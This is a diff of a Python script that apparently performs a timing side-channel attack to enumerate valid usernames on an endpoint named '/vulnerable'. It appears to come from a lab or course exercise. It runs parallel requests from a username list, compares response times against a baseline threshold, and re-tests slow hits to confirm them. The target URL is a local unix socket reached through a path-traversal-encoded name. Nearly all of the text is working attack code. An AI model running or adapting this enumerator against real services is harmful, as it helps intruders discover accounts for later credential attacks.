@@ -5,19 +5,16 @@ import random
 import time
 from string import digits, ascii_lowercase
 
-import eventlet
 import requests
+import requests_unixsocket
+from tqdm import tqdm
 
-eventlet.monkey_patch()
+requests_unixsocket.monkeypatch()
 
-URL_BASE = "http://localhost:8000/vulnerable"
+URL_BASE = "http+unix://venv%2F..%2F..%2Ftp2.sock/vulnerable"
 # URL_BASE = "https://webhook.site/92a94f7c-07c1-428b-831c-4b272bdb25c1"
-MIN = 2
-MAX = 4
 CHARACTERS = ascii_lowercase + digits
 THRESHOLD = 8.0
-
-last_letter = None
 
 
 def split_every(n, iterable):
@@ -34,15 +31,7 @@ def send_request(username, password):
 
 
 def send_attack(username):
-    global last_letter
-
-    time_taken = send_request(username, ".")
-
-    if username[:2] != last_letter:
-        print(username, time_taken)
-        last_letter = username[:2]
-
-    return username, time_taken
+    return username, send_request(username, ".")
 
 
 def initialize_thread():
@@ -52,31 +41,31 @@ def initialize_thread():
 
 
 def attack():
-    print(str(base64.b64encode(f"b:b".encode("utf8"))))
     temps_baseline = send_request(str(random.random()), "")
-    timeout = temps_baseline + temps_baseline * THRESHOLD
+    threshold = temps_baseline + temps_baseline * THRESHOLD
 
     result = []
 
-    print(temps_baseline, timeout)
+    print(f"Baseline:  {temps_baseline}")
+    print(f"Threshold: {threshold}")
 
-    with concurrent.futures.ProcessPoolExecutor(max_workers=8, initializer=initialize_thread) as executor:
-        with open("usernames.txt") as usernames:
-            usernames = map(lambda x: x[:-1], usernames)
-            for chunk in split_every(25, usernames):
+    with concurrent.futures.ProcessPoolExecutor(max_workers=24, initializer=initialize_thread) as executor:
+        with tqdm(open("usernames.txt"), total=sum(1 for _ in open('usernames.txt'))) as tusernames:
+            usernames = map(lambda x: x[:-1], tusernames)
+            for chunk in split_every(720, usernames):
                 for username, time_taken in executor.map(send_attack, chunk):
-                    if time_taken > timeout:
-                        print("=====================")
-                        print(username, time_taken)
-                        print("=====================")
-                        result.append(username)
-                    print(result, end="\r")
+                    if time_taken > threshold:
+                        lowest = min(
+                            send_attack(username)[1],
+                            send_attack(username)[1],
+                            send_attack(username)[1],
+                            send_attack(username)[1],
+                            send_attack(username)[1]
+                        )
+                        if lowest > threshold:
+                            result.append(username)
+                    tusernames.set_description(str(result))
 
-    # pile = eventlet.GreenPile(8)
-    # for length in range(MIN, MAX + 1):
-    #     for username in itertools.product(*([CHARACTERS] * length)):
-    #         username = "".join(username)
-    #         pile.spawn(send_attack, (result, timeout, username, "."))
     return result
 
 
